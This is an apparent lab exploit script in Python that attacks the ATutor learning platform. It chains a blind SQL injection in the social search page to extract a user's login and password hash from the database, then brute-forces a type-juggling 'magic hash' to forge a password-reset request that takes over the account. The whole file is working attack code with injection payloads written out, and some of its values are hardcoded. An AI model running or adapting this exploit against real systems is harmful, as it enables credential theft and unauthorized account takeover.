import sys, re, os, html
import requests
from bs4 import BeautifulSoup
from time import sleep
import hashlib, string, itertools
from io import BytesIO
import zipfile

ascii_list = list(range(48,57)) + list(range(97, 123)) + list(range(32,48)) + list(range(57,64)) + list(range(90,97)) + list(range(123,127)) + list(range(64,90))
# List of characters in (rough) order of frequency
# Numbers, small letters, punctuation, big letters (from 32 to 127)

def searchFriends_sqli(ip, inj_str):
    target = f"http://{ip}/ATutor/mods/_standard/social/index_public.php?q={inj_str}"
    r = requests.get(target)
    s = BeautifulSoup(r.text, 'lxml')

    content_length = int(r.headers['Content-Length'])

    if content_length == 20:
        return False 
    else:
        return True

def extract_data(ip, inj):
    # template = "test')/**/or/**/(ascii(substring((select/**/CURRENT_USER()),<num>,1)))=<inj>%23"
    print(f"Extracting data with inj string: {inj}......")

    output = "" # If we already have stuff, can start output with value and change starting i
    for i in range(1,100):
        new_character = False
        for c in ascii_list: # ASCII letters, numbers and punctuation
            query_string = f"test')/**/or/**/(ascii(substring(({inj}),{i},1)))={c}%23"
            res = searchFriends_sqli(ip, query_string)
            # print(f"Checking {chr(c)}: {query_string} -- {res}")
            if res == True:
                new_character = True
                output += chr(c)
                print(f"Success, adding {chr(c)} -- {output}")
                break
        if not new_character:
            print("No possible characters, breaking now!")
            break
    print(f"Extracted data: {output}")
    return output

def reset_password(ip, params):
    print("Resetting Password.....")
    s = requests.Session()

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
    }
    s.headers.update(headers)
    proxies = {
        'http': 'http://127.0.0.1:8080'
    }
    s.proxies.update(proxies)
    
    target = f'http://{ip}/ATutor/password_reminder.php'
    PASSWORD = 'Bromine1!'
    password_hash = hashlib.sha1(PASSWORD.encode()).hexdigest()

    data = {
        'form_change': 'true',
        'id': params['id'],
        'g': params['g'],
        'h': params['h'], 
        'password': PASSWORD,
        'password2': PASSWORD,
        'form_password_hidden': password_hash,
        'password_error': '',
        'submit': 'Submit'
    }

    r = s.post(target, data=data)

    if re.findall('The link is either invalid or expired', r.text):
        raise Exception("Password reset unsuccessful!")
    print("Password reset successful!")
    return s

# Generate g value to perform type juggling injection
def get_code(id, password):
    print("Searching for valid code......")
    
    for prefix_length in range(1, 5):
        for word in map(''.join,itertools.product(string.ascii_lowercase, \
            repeat=int(prefix_length))):

            raw_string = f"{id}{word}{password}"
            hash = hashlib.sha1(raw_string.encode()).hexdigest()
            hash_prefix = hash[5:20]

            if re.match(r'0+[eE]\d+$', hash_prefix):
                print(f"Valid hash: {hash_prefix}")
                print(f"Raw String: {raw_string}")
                return word

    raise Exception("No valid email found!")
    return ""

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print ("(+) usage: %s <target> <atmail>" % sys.argv[0])
        print ('(+) eg: %s 192.168.121.103 192.168.121.106'  % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]
    atmail_ip = sys.argv[2]

    username_injection_string = "select/**/login/**/FROM/**/AT_members/**/LIMIT/**/1"
    # username = extract_data(ip, username_injection_string)
    username = "teacher"

    password_injection_string = f"select/**/password/**/FROM/**/AT_members/**/WHERE/**/login=\"{username}\""
    # password = extract_data(ip, password_injection_string)
    password = "403178f8e5aa63ca7ffdc42b2766c281cbb593eb"
    # creation_date = "2016-03-10 16:00:00"

    memberid_injection_string = f"select/**/member_id/**/FROM/**/AT_members/**/WHERE/**/login=\"{username}\""
    # member_id = extract_data(ip, memberid_injection_string)
    member_id = 1

    h = 0
    g = get_code(member_id, password)
    print(f"Valid g value found: {g}")

    reset_password('atutor', params = {
        'id': member_id,
        'h': "xx",
        'g': "dbsdab"
    })

